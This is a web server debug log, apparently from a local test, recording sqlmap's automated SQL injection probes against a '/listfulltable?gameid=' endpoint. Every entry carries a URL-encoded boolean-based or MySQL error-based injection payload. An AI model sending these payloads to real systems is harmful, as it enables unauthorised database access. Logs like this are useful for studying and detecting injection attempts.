[D 180302 141352560]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%207622%3D7622%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141358961]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%208388%3D5676%20AND%20%284168%3D4168', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141403938]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%207622%3D7622%20AND%20%284951%3D4951', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141408944]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%201247%3D9335', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141414452]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207622%3D7622', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141420604]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%202279%3D4818--%20zQPX', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141426874]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207622%3D7622--%20eoga', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141447486]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27Lgfn%27%3D%27Lgfn', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141456018]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27YEnq%27%3D%27YEnq', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141503464]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141509376]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%283731%3D3731', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141515135]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%20%28SELECT%206495%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767871%2C%28SELECT%20%28ELT%286495%3D6495%2C1%29%29%29%2C0x7162767a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
